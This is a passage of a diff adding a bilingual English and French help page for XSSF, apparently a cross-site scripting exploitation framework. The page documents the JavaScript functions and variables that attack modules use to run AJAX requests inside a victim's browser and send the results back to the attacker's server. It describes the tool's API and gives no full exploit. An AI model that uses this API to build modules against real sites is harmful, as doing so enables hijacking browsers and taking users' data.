+								<ul>
+									<li> <span style='color:red;'>ID [String]</span>: IFRAME identifier</li>
+									<li> <span style='color:red;'>WIDTH [Integer]</span>: IFRAME width</li>
+									<li> <span style='color:red;'>HEIGHT [Integer]</span>: IFRAME height</li>
+								</ul><br/>
+							<li> <span style='color:green;'>XSSF_POST(Response, Module Name, Headers, Response ID)</span>: Returns a response from the victim to XSSF server</li>
+								<ul>
+									<li> <span style='color:red;'>Response [String]</span>: Result of the XSS attack that has to be returned to XSSF</li>
+									<li> <span style='color:red;'>Module Name [String]</span>: Name of the XSSF module returning the attack</li>
+									<li> <span style='color:orange;'>Headers [String]</span>: HTTP headers corresponding to the response. This option is ONLY used for XSSF Tunnel in order to return requests HTTP headers</li>
+									<li> <span style='color:orange;'>Response ID [String]</span>: Response identifier. This option is ONLY used for XSSF Tunnel in order to link a request from attacker's browser to a victim's response</li>
+								</ul><br/>
+							<li> <span style='color:green;'>XSSF_POST_B64(Response, Module Name)</span>: Returns a Base 64 response from the victim to XSSF server</li>
+								<ul>
+									<li> <span style='color:red;'>Response [String]</span>: Base 64 result of the XSS attack that has to be returned to XSSF (XSSF server will automatically unencode)</li>
+									<li> <span style='color:red;'>Module Name [String]</span>: Name of the XSSF module returning the attack</li>
+								</ul><br/>
+							<li> <span style='color:green;'>XSSF_POST_BINARY_AJAX_RESPONSE(XMLHttpRequest, Method, URL, Module Name, Data, Reponse ID)</span>: This function is useful to perform an AjaX request within victim browser and to return result to XSSF</li>
+								<ul>
+									<li> <span style='color:red;'>XMLHttpRequest [Object]</span>: XMLHttpRequest object. It is possible to simply use '<span style='color:green;'>XSSF_CREATE_XHR()</span>' for this parameter</li>
+									<li> <span style='color:red;'>Method [String]</span>: Method used for the XMLHttpRequest (GET or POST)</li>
+									<li> <span style='color:red;'>URL [String]</span>: URL called from the XMLHttpRequest</li>
+									<li> <span style='color:orange;'>Module Name [String]</span>: Name of the XSSF module returning the attack</li>
+									<li> <span style='color:orange;'>Data [String]</span>: Data sent in case of an XMLHttpRequest POST request</li>
+									<li> <span style='color:orange;'>Response ID [String]</span>: Response identifier. This option is ONLY used for XSSF Tunnel in order to link a request from attacker's browser to a victim's response</li>
+								</ul><br/>
+							<li> <span style='color:green;'>clearTimeout(victim_loop);</span>: Stop the victim loop. Take care of using exactly this function to stop a loop before using an other one on same victim</li>
+						</ul><br/>
+						
+						Some variables are also provided and can be accessed inside modules developement:
+						<ul>
+							<li> <span style='color:green;'>XSSF_SERVER</span>: Address of the XSSF server ('<span style='color:green;'>http://A.B.C.D:E/</span>'). Can be used to load files, etc. Remember, if file needed is in an XSSF IFRAME, don't specify server adress, just '/'</li>
+							<li> <span style='color:green;'>XSSF_VICTIM_ID</span>: Victim's identifier </li>
+							<li> <span style='color:green;'>XSSF_XHR</span>: XMLHttpRequest object. Use it to perform AjaX GET/POST requests</li>
+						</ul><br/><br/>
+						
+						<b style="color:red">NOTE:</b> Other functions are also provided by XSSF JavaScript API, but are not presented here because they are useless for mudules creation.<br/><br/>
+						<b style="color:red">IMPORTANT:</b> All XSSF JavaScript functions, including XSSF_POST can be accessed from anywhere, even inside IFRAME created by developper. XSSF master will automatically add the JavaScript functions where they are needed.
+					</div>
+					
+					<div id="D16fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Fonctions javascript XSSF</center></h2>
+						Dans le but de rendre le développement de modules plus court et plus simple, XSSF fournit une suite de fonctions JavaScript pouvant s'utiliser depuis n'importe où dans les modules :
+						<ul>
+							<li> <span style='color:green;'>XSSF_CREATE_XHR()</span> : Crée et retourne un objet XMLHttpRequest compatible avec le navigateur visé</li>
+							<li> <span style='color:green;'>XSSF_CREATE_IFRAME(ID, WIDTH, HEIGHT)</span> : Crée et retourne un objet IFRAME à l'intérieur de la page avec un identifiant et une taille donnée</li>
+								<ul>
+									<li> <span style='color:red;'>ID [String]</span> : Identifiant de l'IFRAME</li>
+									<li> <span style='color:red;'>WIDTH [Integer]</span> : Largeur de l'IFRAME</li>
+									<li> <span style='color:red;'>HEIGHT [Integer]</span> : Hauteur de l'IFRAME</li>
+								</ul><br/>
+							<li> <span style='color:green;'>XSSF_POST(Response, Module Name, Headers, Response ID)</span> : Retourne une réponse depuis la victime vers le serveur XSSF</li>
+								<ul>
+									<li> <span style='color:red;'>Response [String]</span> : Résultat de l'attaque XSS à retourner à XSSF</li>
+									<li> <span style='color:red;'>Module Name [String]</span> : Nom du module XSSF retournant le résultat</li>
+									<li> <span style='color:orange;'>Headers [String]</span> : Entêtes HTTP correspondants à la réponse. Cette option est UNIQUEMENT utilisée par le Tunnel XSSF dans le but de retourner les entêtes HTTP de la réponse</li>
+									<li> <span style='color:orange;'>Response ID [String]</span> : Identifiant de réponse. Cette option est pour l'instant UNIQUEMENT utilisée par le Tunnel XSSF dans le but de lier une réponse reçue à une requête envoyée depuis le navigateur de l'attaquant</li>
+								</ul><br/>
+							<li> <span style='color:green;'>XSSF_POST_B64(Response, Module Name)</span> : Retourne une réponse en Base 64 depuis la victime vers le serveur XSSF</li>
+								<ul>
+									<li> <span style='color:red;'>Response [String]</span> : Résultat de l'attaque XSS en Base 64 à retourner à XSSF (le serveur XSSF fera automatiquement le "désencodage")</li>
+									<li> <span style='color:red;'>Module Name [String]</span> : Nom du module XSSF retournant le résultat</li>
+								</ul><br/>
+							<li> <span style='color:green;'>XSSF_POST_BINARY_AJAX_RESPONSE(XMLHttpRequest, Method, URL, Module Name, Data, Reponse ID)</span> : Cette fonction permet de réaliser une requête AjaX à l'intérieur du navigateur de la victime et d'en retourner le résultat à XSSF</li>
+								<ul>
+									<li> <span style='color:red;'>XMLHttpRequest [Object]</span> : Objet XMLHttpRequest. Il est possible d'utiliser simplement la fonction'<span style='color:green;'>XSSF_CREATE_XHR()</span>' pour renseigner ce paramètre</li>
+									<li> <span style='color:red;'>Method [String]</span> : Méthode à utiliser pour la requête XMLHttpRequest (GET ou POST)</li>
+									<li> <span style='color:red;'>URL [String]</span> : URL à appeler grâce au XMLHttpRequest</li>
+									<li> <span style='color:orange;'>Module Name [String]</span> : Nom du module XSSF retournant le résultat</li>
+									<li> <span style='color:orange;'>Data [String]</span> : Données à envoyer grâce au XMLHttpRequest dans le cas d'une requête POST</li>
+									<li> <span style='color:orange;'>Response ID [String]</span> : Identifiant de réponse. Cette option est pour l'instant UNIQUEMENT utilisée par le Tunnel XSSF dans le but de lier une réponse reçue à une requête envoyée depuis le navigateur de l'attaquant</li>
+								</ul><br/>
+							<li> <span style='color:green;'>clearTimeout(victim_loop);</span> : Arrêt de la boucle XSSF principale. Prenez soin d'utiliser exactement cette commande pour arrêter la boucle principale avant d'en démarrer une autre sur la même victime</li>
+						</ul><br/>
+						
+						Quelques variables sont aussi fournies et peuvent s'utiliser à l'intérieur des modules :
+						<ul>
+							<li> <span style='color:green;'>XSSF_SERVER</span> : Adresse du serveur XSSF ('<span style='color:green;'>http://A.B.C.D:E/</span>'). Peut s'utiliser pour charger des fichiers, etc. Si le fichier est appelé dans une IFRAME XSSF, il n'est pas nécessaire de préciser l'adresse du serveur XSSF mais seulement '/'. </li>
+							<li> <span style='color:green;'>XSSF_VICTIM_ID</span> : Identifiant de victime </li>
+							<li> <span style='color:green;'>XSSF_XHR</span> : Objet XMLHttpRequest. A utiliser pour réaliser des requêtes AjaX GET/POST</li>
+						</ul><br/><br/>
+						
+						<b style="color:red">NOTE :</b> Quelques fonctions JavaScript supplémentaires sont fournies par l'API XSSF mais ne sont pas présentées ici car inutiles pour la création de modules.<br/><br/>
+						<b style="color:red">IMPORTANT :</b> Toutes les fonctions JavaScript XSSF, y compris XSSF_POST, peuvent s'utiliser depuis n'importe quel endroit dans les modules, même à l'intérieur d'une IFRAME créée par l'attaquant. Le serveur maître XSSF se charge d'ajouter automatiquement ces fonctions lorsqu'elles sont utiles.
+					</div>
+				</td>
+			</tr>
+		</table>
+	</body>
+</html>
